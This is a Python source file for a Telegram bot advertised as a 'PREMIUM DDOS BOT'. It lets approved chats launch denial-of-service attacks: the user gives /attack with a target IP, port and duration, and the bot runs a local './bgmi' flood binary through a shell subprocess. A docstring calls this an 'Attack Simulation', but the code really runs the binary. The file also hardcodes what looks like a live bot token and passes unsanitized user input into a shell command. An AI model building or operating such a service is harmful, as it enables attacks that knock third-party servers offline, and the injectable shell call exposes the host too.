import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext, MessageHandler, filters
import os
import time

# Configuration
TELEGRAM_BOT_TOKEN = "7140094105:AAEbc645NvvWgzZ5SJ3L8xgMv6hByfg2n_4"
ADMIN_USER_ID = 1662672529  # The admin user ID who can approve/remove
CHANNEL_ID = "@jsbananannanan"
SHARE_THRESHOLD = 5  # Number of users to forward the link to

# Approved Chats File
APPROVED_CHATS_FILE = 'approved_chats.txt'

# Cooldown for commands (300 seconds)
COOLDOWN_TIME = 300  # 5 minutes cooldown

# Load and Save Approved Chats
def load_approved_chats():
    """Load approved chats data."""
    try:
        with open(APPROVED_CHATS_FILE, 'r') as file:
            return {line.strip() for line in file.readlines()}
    except FileNotFoundError:
        return set()

def save_approved_chats(approved_chats):
    """Save approved chats data."""
    with open(APPROVED_CHATS_FILE, 'w') as file:
        for chat_id in approved_chats:
            file.write(f"{chat_id}\n")

approved_chats = load_approved_chats()

# Cooldown tracking
last_used = {}

# Helper Function: Check if the chat is approved
def is_chat_approved(chat_id: str):
    """Check if the chat is approved."""
    return str(chat_id) in approved_chats

# Helper Function: Check Cooldown
def check_cooldown(user_id):
    """Check if the user is on cooldown."""
    current_time = time.time()
    last_time = last_used.get(user_id, 0)
    
    if current_time - last_time < COOLDOWN_TIME:
        return False, last_time  # Not enough time has passed
    return True, current_time  # Cooldown has passed

# Commands
async def start(update: Update, context: CallbackContext):
    """Send a welcome message to the user."""
    chat_id = update.effective_chat.id
    message = (
        "*WELCOME TO GODxCHEATS DDOS*\n\n"
        "*PREMIUM DDOS BOT*\n"
        "*Owner*: @GODxAloneBOY\n"
        f"🔔 *Join our channel*: {CHANNEL_ID} to use advanced features.\n\n"
        "Use /help to see available commands.\n\n"
        "*Share the channel link with 5 users to unlock bot usage.*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def help_command(update: Update, context: CallbackContext):
    """Send a list of available commands and their usage."""
    chat_id = update.effective_chat.id
    message = (
        "*Available Commands:*\n\n"
        "/start - Start the bot and get a welcome message.\n"
        "/help - Show this help message.\n"
        "/approve <chat_id> - Approve a chat for usage.\n"
        "/remove <chat_id> - Remove a chat from the approved list.\n"
        "/attack <ip> <port> <time> - Launch an attack (only if shared the link with 5 users).\n"
        "/referral - Check your referral progress."
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# Approve Command
async def approve(update: Update, context: CallbackContext):
    """Approve a chat ID for usage (only for admin)."""
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="You are not authorized to approve chats.")
        return
    
    # Cooldown check for admin command
    is_cooldown, last_time = check_cooldown(user_id)
    if not is_cooldown:
        await context.bot.send_message(chat_id=chat_id, text=f"Cooldown active. Please wait {int(COOLDOWN_TIME - (time.time() - last_time))} seconds.")
        return
    
    last_used[user_id] = time.time()

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*Usage: /approve <chat_id>*", parse_mode='Markdown')
        return

    chat_to_approve = context.args[0]

    if chat_to_approve in approved_chats:
        await context.bot.send_message(chat_id=chat_id, text="This chat is already approved.")
    else:
        approved_chats.add(chat_to_approve)
        save_approved_chats(approved_chats)
        await context.bot.send_message(chat_id=chat_id, text=f"Chat ID {chat_to_approve} has been approved.")

# Remove Command
async def remove(update: Update, context: CallbackContext):
    """Remove a chat ID from the approved list (only for admin)."""
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="You are not authorized to remove chats.")
        return
    
    # Cooldown check for admin command
    is_cooldown, last_time = check_cooldown(user_id)
    if not is_cooldown:
        await context.bot.send_message(chat_id=chat_id, text=f"Cooldown active. Please wait {int(COOLDOWN_TIME - (time.time() - last_time))} seconds.")
        return
    
    last_used[user_id] = time.time()

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*Usage: /remove <chat_id>*", parse_mode='Markdown')
        return

    chat_to_remove = context.args[0]

    if chat_to_remove not in approved_chats:
        await context.bot.send_message(chat_id=chat_id, text="This chat is not in the approved list.")
    else:
        approved_chats.remove(chat_to_remove)
        save_approved_chats(approved_chats)
        await context.bot.send_message(chat_id=chat_id, text=f"Chat ID {chat_to_remove} has been removed from the approved list.")

# Attack Command (Only allowed if the chat is approved)
async def attack(update: Update, context: CallbackContext):
    """Allow users to launch attacks if they meet the share condition and chat is approved."""
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    args = context.args

    if not is_chat_approved(chat_id):
        await context.bot.send_message(chat_id=chat_id, text="This chat is not approved to use the bot.")
        return
    
    # Cooldown check for attack command
    is_cooldown, last_time = check_cooldown(user_id)
    if not is_cooldown:
        await context.bot.send_message(chat_id=chat_id, text=f"Cooldown active. Please wait {int(COOLDOWN_TIME - (time.time() - last_time))} seconds.")
        return
    
    last_used[user_id] = time.time()

    # Check if user shared the channel with enough people (this part is still similar to your logic)
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*Usage: /attack <ip> <port> <time>*", parse_mode='Markdown')
        return

    ip, port, time = args

    await context.bot.send_message(chat_id=chat_id, text=(
        f"*✅ Attack Starting*\n\n"
        f"🎯 *Target IP*: {ip}\n"
        f"🔌 *Port*: {port}\n"
        f"⏱ *Duration*: {time} seconds\n"
        f"🛠 Attack is now in progress. Please wait..."
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, time, context))

# Attack Simulation
async def run_attack(chat_id, ip, port, time, context):
    """Simulate an attack process."""
    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {time} 500",  # Example attack command
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

        if process.returncode == 0:
            await context.bot.send_message(chat_id=chat_id, text="*✅ The attack has completed successfully!*\n\nThank you for using the bot.", parse_mode='Markdown')
        else:
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ The attack encountered an error and couldn't complete.*", parse_mode='Markdown')

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

# Main Function
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Command Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))
    application.add_handler(CommandHandler("attack", attack))

    application.run_polling()

if __name__ == '__main__':
    main()
